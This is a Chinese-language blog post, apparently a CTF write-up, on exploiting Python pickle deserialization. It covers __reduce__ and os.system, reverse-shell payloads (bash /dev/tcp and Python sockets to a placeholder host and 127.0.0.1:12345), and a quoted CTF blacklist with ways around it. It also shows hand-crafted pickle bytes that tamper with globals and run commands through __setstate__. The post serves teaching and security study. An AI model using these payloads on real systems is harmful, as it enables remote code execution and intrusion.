<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python反序列化</title>
    <url>/2020/12/31/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。python序列化出来的是pickle流，这是一种栈语言。</p>
<p>pickle简介</p>
<blockquote>
<p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。<br>PVM 由三部分组成：<br><strong>指令处理器</strong><br>从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。<br>最终留在栈顶的值将被作为反序列化对象返回。<br><strong>栈区stack</strong><br>由 Python 的 list 实现，被用来临时存储数据、参数以及对象。<br><strong>标签区memo</strong><br>由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。</p>
</blockquote>
<p><strong>PVM操作码</strong></p>
<p>//pickle.py</p>
<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5CUsers%5C12986%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201222154315827.png" srcset="/img/loading.gif" alt="image-20201222154315827"></p>
<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5CUsers%5C12986%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201222154350609.png" srcset="/img/loading.gif" alt="image-20201222154350609"></p>
<p>重点关注</p>
<blockquote>
<pre><code>c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。
(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。
t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。
S：读取引号中的字符串直到换行符处，然后将它压入堆栈。
R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。
.：结束pickle。</code></pre></blockquote>
<p>几个不同类型的python反序列化例子</p>
<p>python 2、3使用的pickle协议版本不同，但却是向下兼容的，这里不再过多阐述他们之间的区别。</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p> python的pickle反序列化之所以会造成一些漏洞，是因为其内部存在一个魔术方法_ <em>reduce</em> _，其底层方法为<strong>R指令码</strong>。这个方法可以返回String和tuple类型的值，而在返回值为tuple时，就可以实现任意命令执行。</p>
<blockquote>
<p>_ <em>reduce</em> _：当序列化以及反序列化的过程中中碰到一无所知的扩展类型(这里指的就是<strong>新式类</strong>)的时候，可以通过类中定义的<strong>reduce</strong>方法来告知如何进行序列化或者反序列化</p>
</blockquote>
<p>关于新式类和旧式类：</p>
<blockquote>
<p>​    <a href="http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/" target="_blank" rel="noopener">http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/</a></p>
</blockquote>
<p>当返回值是一个元祖的时候（2-5个参数），第一个参数是可调用（callable）的对象，第二个是该对象所需的参数元组。在这种情况下，反序列化时会自动执行<strong>reduce</strong>里面的操作。</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">//</span>python2
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> os
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
test <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token keyword">print</span> test
pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>test<span class="token punctuation">)</span></code></pre>
<p>执行结果</p>
<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5CUsers%5C12986%5CDesktop%5Cwp%5CPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets%5Cimage-20210104225654282.png" srcset="/img/loading.gif" alt="image-20210104225654282"></p>
<p>反弹shell脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> os
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        shell <span class="token operator">=</span> <span class="token triple-quoted-string string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>shell<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    
a<span class="token operator">=</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre>
<h2 id="绕过黑名单-各种例题"><a href="#绕过黑名单-各种例题" class="headerlink" title="绕过黑名单(各种例题)"></a>绕过黑名单(各种例题)</h2><h3 id="函数黑名单"><a href="#函数黑名单" class="headerlink" title="函数黑名单"></a>函数黑名单</h3><p>2018-XCTF-HITB-WEB : Python’s-Revenge中，黑名单如下：</p>
<pre class=" language-text"><code class="language-text">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</code></pre>
<p>题解</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">return</span> map<span class="token punctuation">,</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"ls"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
<p>另外的解就是用platform.popen()。</p>
<p>顺便记录一下好用函数</p>
<pre class=" language-python"><code class="language-python">eval<span class="token punctuation">,</span> execfile<span class="token punctuation">,</span> compile<span class="token punctuation">,</span> open<span class="token punctuation">,</span> file<span class="token punctuation">,</span> map<span class="token punctuation">,</span> input<span class="token punctuation">,</span>
os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen2<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen3<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen4<span class="token punctuation">,</span> os<span class="token punctuation">.</span>open<span class="token punctuation">,</span> os<span class="token punctuation">.</span>pipe<span class="token punctuation">,</span>
os<span class="token punctuation">.</span>listdir<span class="token punctuation">,</span> os<span class="token punctuation">.</span>access<span class="token punctuation">,</span>
os<span class="token punctuation">.</span>execl<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execle<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execlp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execlpe<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execv<span class="token punctuation">,</span>
os<span class="token punctuation">.</span>execve<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execvp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execvpe<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnl<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnle<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnlp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnlpe<span class="token punctuation">,</span>
os<span class="token punctuation">.</span>spawnv<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnve<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnvp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnvpe<span class="token punctuation">,</span>
pickle<span class="token punctuation">.</span>load<span class="token punctuation">,</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">,</span>cPickle<span class="token punctuation">.</span>load<span class="token punctuation">,</span>cPickle<span class="token punctuation">.</span>loads<span class="token punctuation">,</span>
subprocess<span class="token punctuation">.</span>call<span class="token punctuation">,</span>subprocess<span class="token punctuation">.</span>check_call<span class="token punctuation">,</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">,</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">,</span>
commands<span class="token punctuation">.</span>getstatusoutput<span class="token punctuation">,</span>commands<span class="token punctuation">.</span>getoutput<span class="token punctuation">,</span>commands<span class="token punctuation">.</span>getstatus<span class="token punctuation">,</span>
glob<span class="token punctuation">.</span>glob<span class="token punctuation">,</span>
linecache<span class="token punctuation">.</span>getline<span class="token punctuation">,</span>
shutil<span class="token punctuation">.</span>copyfileobj<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>copyfile<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>copy<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>copy2<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>move<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>make_archive<span class="token punctuation">,</span>
dircache<span class="token punctuation">.</span>listdir<span class="token punctuation">,</span>dircache<span class="token punctuation">.</span>opendir<span class="token punctuation">,</span>
io<span class="token punctuation">.</span>open<span class="token punctuation">,</span>
popen2<span class="token punctuation">.</span>popen2<span class="token punctuation">,</span>popen2<span class="token punctuation">.</span>popen3<span class="token punctuation">,</span>popen2<span class="token punctuation">.</span>popen4<span class="token punctuation">,</span>
timeit<span class="token punctuation">.</span>timeit<span class="token punctuation">,</span>timeit<span class="token punctuation">.</span>repeat<span class="token punctuation">,</span>
sys<span class="token punctuation">.</span>call_tracing<span class="token punctuation">,</span>
code<span class="token punctuation">.</span>interact<span class="token punctuation">,</span>code<span class="token punctuation">.</span>compile_command<span class="token punctuation">,</span>codeop<span class="token punctuation">.</span>compile_command<span class="token punctuation">,</span>
pty<span class="token punctuation">.</span>spawn<span class="token punctuation">,</span>
posixfile<span class="token punctuation">.</span>open<span class="token punctuation">,</span>posixfile<span class="token punctuation">.</span>fileopen<span class="token punctuation">,</span>
platform<span class="token punctuation">.</span>popen
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
map<span class="token punctuation">(</span>__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'bash -c "bash -i >&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2>&amp;1"'</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

sys<span class="token punctuation">.</span>call_tracing<span class="token punctuation">(</span>__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'bash -c "bash -i >&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2>&amp;1"'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

platform<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span><span class="token punctuation">)</span></code></pre>
<h3 id="彻底过滤R指令码"><a href="#彻底过滤R指令码" class="headerlink" title="彻底过滤R指令码"></a>彻底过滤R指令码</h3><p>c指令码</p>
<pre class=" language-python"><code class="language-python">GLOBAL         <span class="token operator">=</span> b<span class="token string">'c'</span>   <span class="token comment" spellcheck="true"># push self.find_class(modname, name); 2 string args</span></code></pre>
<p>可以看到c指令码通过引用find_class实现功能。find_class读取全局变量，并规定以\n为分割，</p>
<blockquote>
<p><code>find_class</code>(<em>module</em>, <em>name</em>)</p>
<p>如有必要，导入 <em>module</em> 模块并返回其中名叫 <em>name</em> 的对象，其中 <em>module</em> 和 <em>name</em> 参数都是 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#str" target="_blank" rel="noopener"><code>str</code></a> 对象。注意，不要被这个函数的名字迷惑， <a href="https://docs.python.org/zh-cn/3/library/pickle.html#pickle.Unpickler.find_class" target="_blank" rel="noopener"><code>find_class()</code></a> 同样可以用来导入函数。</p>
<p>子类可以重载此方法，来控制加载对象的类型和加载对象的方式，从而尽可能降低安全风险。参阅 <a href="https://docs.python.org/zh-cn/3/library/pickle.html#pickle-restrict" target="_blank" rel="noopener">限制全局变量</a> 获取更详细的信息。</p>
<p>引发一个 <a href="https://docs.python.org/zh-cn/3/library/sys.html#auditing" target="_blank" rel="noopener">审计事件</a> <code>pickle.find_class</code> 附带参数 <code>module</code>、<code>name</code>。</p>
</blockquote>
<p>这道题就是直接过滤R，使R指令彻底不能用了。而问题是我们并不知道test.name,test.date的值。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> test
<span class="token keyword">import</span> base64

<span class="token keyword">class</span> <span class="token class-name">Stu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>date<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>date <span class="token operator">=</span> date

    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> type<span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name   <span class="token operator">and</span> self<span class="token punctuation">.</span>date<span class="token operator">==</span>other<span class="token punctuation">.</span>date

<span class="token comment" spellcheck="true">#a=pickle.dumps(Stu('dwm2','2021'))</span>
<span class="token comment" spellcheck="true">#print(pickletools.optimize(a))</span>

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token string">'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Hacker!!!'</span>
    x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> Stu<span class="token punctuation">(</span>test<span class="token punctuation">.</span>name<span class="token punctuation">,</span>test<span class="token punctuation">.</span>date<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'False!!!'</span>
    <span class="token keyword">return</span> <span class="token string">'Success!'</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>我们先正常输出一个序列值。</p>
<pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\nStu\n)\x81}(X\x04\x00\x00\x00nameX\x04\x00\x00\x00dwm2X\x04\x00\x00\x00dateX\x04\x00\x00\x002021ub.'</span></code></pre>
<p>以他为标准构造payload,将X\x04\x00\x00\x00dwm2替换为ctest\nname\n;将X\x04\x00\x00\x002021替换为ctest\ndate\n。</p>
<p>即</p>
<pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\nStu\n)\x81}(X\x04\x00\x00\x00namectest\nname\nX\x04\x00\x00\x00datectest\ndate\nub.'</span>
<span class="token comment" spellcheck="true">#再base64编码一下</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">'\x80\x03c__main__\nStu\n)\x81}(X\x04\x00\x00\x00namectest\nname\nX\x04\x00\x00\x00datectest\ndate\nub.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
<span class="token comment" spellcheck="true">#payload</span>
gANjX19tYWluX18KU3R1CimBfShYBAAAAG5hbWVjdGVzdApuYW1lClgEAAAAZGF0ZWN0ZXN0CmRhdGUKdWIu</code></pre>
<p>输出成功</p>
<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5CUsers%5C12986%5CDesktop%5Cwp%5CPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets%5Cimage-20210105112753274.png" srcset="/img/loading.gif" alt="image-20210105112753274"></p>
<h3 id="绕过c指令module限制"><a href="#绕过c指令module限制" class="headerlink" title="绕过c指令module限制"></a>绕过<code>c</code>指令<code>module</code>限制</h3><p>上面知道c指令码通过引用find_class实现功能，而find_class是可以被重写的。如果和下面的代码一样，重写的类中只允许c指令包含<strong>main</strong>这一个module：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> test
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> io
<span class="token keyword">import</span> sys

<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Stu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>date<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>date <span class="token operator">=</span> date

    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> type<span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token operator">and</span> self<span class="token punctuation">.</span>date<span class="token operator">==</span>other<span class="token punctuation">.</span>date

<span class="token comment" spellcheck="true">#a=pickle.dumps(Stu('dwm2','2021'))</span>
<span class="token comment" spellcheck="true">#print(pickletools.optimize(a))</span>

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token string">'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Hacker!!!'</span>
    x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> Stu<span class="token punctuation">(</span>test<span class="token punctuation">.</span>name<span class="token punctuation">,</span>test<span class="token punctuation">.</span>date<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'False!!!'</span>
    <span class="token keyword">return</span> <span class="token string">'Success!'</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>这里有一个知识点：通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改。</p>
<p>那我们的思路就变成了通过篡改test.py中的name和date的值以达成目标。</p>
<p>构造payload具体操作如下：</p>
<ul>
<li>引入test这个moudle:__ main __.test。命名空间在main中，不会被过滤。</li>
<li>把dict格式的数据，{‘name’:’123’,’date’:’456’}压入栈中。</li>
<li>执行BUILD命令，篡改test.name和test.date。</li>
<li>弹掉栈顶，使栈为空。</li>
<li>压入一个标准的Stu对象，它的name和date的值分别是123和456。</li>
</ul>
<p>payload</p>
<pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\ntest\n}(Vname\nV123\nVdate\nV456\nub0c__main__\nStu\n)\x81}(X\x04\x00\x00\x00nameX\x03\x00\x00\x00123X\x04\x00\x00\x00dateX\x03\x00\x00\x00456ub.'</span></code></pre>
<p>篡改后的序列化字符串格式</p>
<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5CUsers%5C12986%5CDesktop%5Cwp%5CPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets%5Cimage-20210105140019864.png" srcset="/img/loading.gif" alt="image-20210105140019864"></p>
<p>传入编码后的payload，可以看到输出success。此时test.name和test.date的值是123和456。</p>
<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5CUsers%5C12986%5CDesktop%5Cwp%5CPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets%5Cimage-20210105140708010.png" srcset="/img/loading.gif" alt="image-20210105140708010"></p>
<h3 id="不用reduce的RCE方法"><a href="#不用reduce的RCE方法" class="headerlink" title="不用reduce的RCE方法"></a>不用reduce的RCE方法</h3><p>这里利用的是b指令码。b指令码用来更新对象的属性。</p>
<pre class=" language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">load_build</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack
        state <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
        inst <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
        setstate <span class="token operator">=</span> getattr<span class="token punctuation">(</span>inst<span class="token punctuation">,</span> <span class="token string">"__setstate__"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>
        <span class="token keyword">if</span> setstate<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#如果__setstate__存在，state就由它来处理</span>
            setstate<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        slotstate <span class="token operator">=</span> None
        <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>state<span class="token punctuation">,</span> tuple<span class="token punctuation">)</span> <span class="token operator">and</span> len<span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
            state<span class="token punctuation">,</span> slotstate <span class="token operator">=</span> state
        <span class="token keyword">if</span> state<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#不存在就将state这个dict放入inst.__dict中</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                d <span class="token operator">=</span> inst<span class="token punctuation">.</span>__dict__
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> state<span class="token punctuation">.</span>iteritems<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        d<span class="token punctuation">[</span>intern<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> v
                <span class="token keyword">except</span> TypeError<span class="token punctuation">:</span>
                    d<span class="token punctuation">.</span>update<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
            <span class="token keyword">except</span> RuntimeError<span class="token punctuation">:</span>
                <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> state<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    setattr<span class="token punctuation">(</span>inst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>
        <span class="token keyword">if</span> slotstate<span class="token punctuation">:</span>
            <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> slotstate<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                setattr<span class="token punctuation">(</span>inst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>
    dispatch<span class="token punctuation">[</span>BUILD<span class="token punctuation">]</span> <span class="token operator">=</span> load_build</code></pre>
<p>还是接上面的题目。如果在Stu中利用{‘__ setstate __ ‘: os.system}build一个对象，那么这个对象的__ setstate __ 现在就是os.system了。之后以’ls /‘再次build一个对象，这个对象的__ setstate __已经是os.system，也就成功RCE了。</p>
<p>payload</p>
<pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\nStu\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb.'</span></code></pre>
<p>命令执行成功。</p>
